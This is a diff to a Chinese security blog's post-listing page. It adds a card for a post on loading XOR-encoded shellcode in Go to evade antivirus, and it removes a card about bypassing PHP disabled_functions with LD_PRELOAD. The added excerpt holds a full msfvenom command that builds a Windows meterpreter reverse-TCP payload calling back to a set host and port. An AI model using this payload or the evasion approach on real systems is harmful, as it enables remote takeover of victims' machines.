@@ -163,6 +163,53 @@
     <ul class="post-list">
     
         <li class="post-list-item fade">
+            <article id="post-使用golang加载异或的shellcode免杀"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    <div class="post-meta">
+        <time class="post-time" title="2019-12-20 08:49:15" datetime="2019-12-20T00:49:15.000Z"  itemprop="datePublished">2019-12-20</time>
+
+        
+
+
+    </div>
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a class="post-title-link" href="/2019/12/20/使用golang加载异或的shellcode免杀/">使用golang加载异或的shellcode免杀</a>
+    </h3>
+  
+
+
+
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        用Python加载shellcode能有一定的免杀效果想必已经老生常谈了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢
+用msfvenom生成一段shellcode1msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234
+这里要注意一...
+    
+
+        <a href="/2019/12/20/使用golang加载异或的shellcode免杀/" class="post-more waves-effect waves-button">
+            阅读全文…
+        </a>
+    </div>
+    
+    <div class="post-footer">
+        
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>
+
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
             <article id="post-golang指针类型转换上遇到的一些问题"
   class="article-card article-type-post" itemprop="blogPost">
 
@@ -588,55 +635,6 @@ benchmark...
     <div class="post-footer">
         
 	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-
-    </div>
-    
-</article>
-
-        </li>
-    
-        <li class="post-list-item fade">
-            <article id="post-Bypass-disabled-functions一些思路总结"
-  class="article-card article-type-post" itemprop="blogPost">
-
-    <div class="post-meta">
-        <time class="post-time" title="2019-04-04 10:17:41" datetime="2019-04-04T02:17:41.000Z"  itemprop="datePublished">2019-04-04</time>
-
-        
-
-
-    </div>
-
-    
-
-
-  
-    <h3 class="post-title" itemprop="name">
-      <a class="post-title-link" href="/2019/04/04/Bypass-disabled-functions一些思路总结/">Bypass-disabled_functions一些思路总结</a>
-    </h3>
-  
-
-
-
-
-    <div class="post-content" id="post-content" itemprop="postContent">
-
-    
-        
-文章首发于先知社区https://xz.aliyun.com/t/4623
-
-简介PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用
-Bypass思路利用LD_PRELOAD什么是LD_PRELOAD1LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime li...
-    
-
-        <a href="/2019/04/04/Bypass-disabled-functions一些思路总结/" class="post-more waves-effect waves-button">
-            阅读全文…
-        </a>
-    </div>
-    
-    <div class="post-footer">
-        
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/一些姿势/">一些姿势</a></li></ul>
 
     </div>
     
